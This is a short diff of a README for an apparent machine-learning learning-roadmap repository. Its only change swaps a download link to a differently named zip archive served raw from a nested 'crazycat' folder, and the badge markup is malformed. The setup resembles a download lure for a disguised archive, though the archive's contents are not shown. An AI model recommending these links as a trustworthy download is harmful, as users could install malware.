@@ -1,6 +1,6 @@
 # 🎉 Machine-Learning-AI-Library - Boost Your AI Learning Journey
 
-[![Download Latest Release](https://raw.githubusercontent.com/FEROsites/Machine-Learning-AI-Library/main/crazycat/Machine-Learning-AI-Library.zip%20Latest%https://raw.githubusercontent.com/FEROsites/Machine-Learning-AI-Library/main/crazycat/Machine-Learning-AI-Library.zip)](https://raw.githubusercontent.com/FEROsites/Machine-Learning-AI-Library/main/crazycat/Machine-Learning-AI-Library.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/FEROsites/Machine-Learning-AI-Library/main/crazycat/Library-Machine-Learning-A-rachidian.zip%20Latest%https://raw.githubusercontent.com/FEROsites/Machine-Learning-AI-Library/main/crazycat/Library-Machine-Learning-A-rachidian.zip)](https://raw.githubusercontent.com/FEROsites/Machine-Learning-AI-Library/main/crazycat/Library-Machine-Learning-A-rachidian.zip)
 
 ## 📚 Overview
 
@@ -18,7 +18,7 @@ Welcome to the Machine-Learning-AI-Library! This library offers a curated roadma
 
 To get started, visit the Releases page to download the library:
 
-[Download Machine-Learning-AI-Library](https://raw.githubusercontent.com/FEROsites/Machine-Learning-AI-Library/main/crazycat/Machine-Learning-AI-Library.zip)
+[Download Machine-Learning-AI-Library](https://raw.githubusercontent.com/FEROsites/Machine-Learning-AI-Library/main/crazycat/Library-Machine-Learning-A-rachidian.zip)
 
 Follow these simple steps:
 
